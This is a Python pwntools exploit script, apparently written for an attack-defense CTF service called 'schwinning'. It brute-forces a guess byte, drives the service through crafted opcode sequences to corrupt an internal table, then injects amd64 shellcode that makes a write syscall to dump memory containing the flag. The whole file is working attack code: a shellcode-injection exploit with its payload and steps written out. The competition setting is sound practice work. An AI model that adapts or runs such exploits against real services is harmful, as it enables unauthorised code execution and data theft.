#!/usr/bin/env python3
from pwn import *
import random
import struct
import requests
import sys

# CHANGEME: THIS TO YOUR SERVICE NAME
SERVICE_NAME = "schwinning"

# ip = sys.argv[1]
# team_id = ip.split(".")[-2]
# get port
# port = int(
#     requests.get(
#         f"http://ports.arena.mhackeroni.it:5000/port_by_service_team/{SERVICE_NAME}/{team_id}"
#     ).text
# )
ip = "localhost"
port=23946
print(f"Port: {port}")


cl = b"])}>"
op = b"[({<"
cnt = 0
starting_file_name = 0x71680067C30B175D
guess = 0
r = None

context.arch="amd64"
# Call write, stdout
shellcode = """
mov rax, [rbp-0x38]
mov rsi , rax
mov rax, 1
mov rdi, 1
mov rdx, 256
syscall
"""

shellcode = asm(shellcode)

def opt_50():
    global r, cnt, starting_file_name
    r.send(bytes([50]))
    res = r.recv(8)
    return struct.unpack('<d', res)[0]

def opt_51():
    global r, cnt, starting_file_name
    r.send(bytes([51]))
    return

def opt_60():
    global r, cnt
    cnt += 1
    cnt &= 0xff
    r.send(bytes([60]))
    r.send(bytes([60]))
    return

def opt_ff(i):
    global r, cnt
    cnt += 1
    cnt &= 0xff
    r.send(bytes([0xff]))
    r.send(bytes([i]))
    return r.recv(1)

def opt_other(idx, val):
    global r, cnt
    cnt += 1
    cnt &= 0xff
    r.send(bytes([idx]))
    r.send(bytes([val]))
    return

def opt_other_neg(idx, offset, val):
    global r, cnt
    cnt += 1
    cnt &= 0xff
    r.send(bytes([idx]))
    r.send(bytes([0x80]))
    r.send(bytes([val, offset]))
    return

def send_guess():
    global r, guess
    r.send(bytes([guess]))
    return r.read(1)

def get_guess():
    global r, guess
    while True:
        r = remote(ip, port)
        #r = process(["./schwinning"])
        lo = 0
        hi = 48
        mid = (hi+lo)//2
        f = False
        for i in range(5):
            r.send(bytes([mid]))
            res = r.read(1)
            if res ==  b"=":
                guess = mid
                f = True
                break
            elif res in cl:
                hi = mid + 1
            else:
                lo = mid - 1
            mid = (hi+lo)//2
        if f:
            break
        guess = random.randint(lo,hi)
        r.send(bytes([guess]))
        res = r.read(1)

        if res == b"=":
            break
        r.close()


get_guess()

res = []
map_idx = {}
updates = {}

base = opt_50()
r.send(bytes([guess]))
r.recv(1)

# Reaching 5/6 of correct values
for val in range(48):
    tmp = opt_ff(val)
    map_idx[val] = tmp
    r.send(bytes([guess]))
    r.recv(1)

for idx in range(39):
    print(idx, base, val)
    if idx == guess:
        continue
    mx = base
    for val in range(0,48):
        opt_other(idx, val)
        r.send(bytes([guess]))
        r.recv(1)
        current = opt_50()
        r.send(bytes([guess]))
        r.recv(1)
        if val == 1 and current < base:
            opt_other(idx, 0)
            r.send(bytes([guess]))
            r.recv(1)
            break
        if current > base:
            base = current
            break




# Triggering table init
print("Triggering table init")
opt_60()
r.send(bytes([guess]))
r.recv(1)

# Filling the table
my_id = (guess + 1) % 48
for i in range(256):
    print(my_id, i)
    opt_other_neg(my_id, i, 0xff)
    r.send(bytes([guess]))
    r.recv(1)

# Reaching infinity
base = opt_50()
r.send(bytes([guess]))
r.recv(1)

for idx in range(39, 48):
    if idx == guess:
        continue
    mx = base
    for val in range(0,48):
        opt_other(idx, val)
        r.send(bytes([guess]))
        r.recv(1)
        current = opt_50()
        r.send(bytes([guess]))
        r.recv(1)
        if val == 1 and current < base:
            opt_other(idx, 0)
            r.send(bytes([guess]))
            r.recv(1)
            break
        if current > base:
            base = current
            break

base = opt_50()
r.send(bytes([guess]))
r.recv(1)
print(base)

opt_51()

context.log_level = 'debug'

r.send(shellcode)
flag = r.recvuntil(b"}")
print(flag)
r.close()   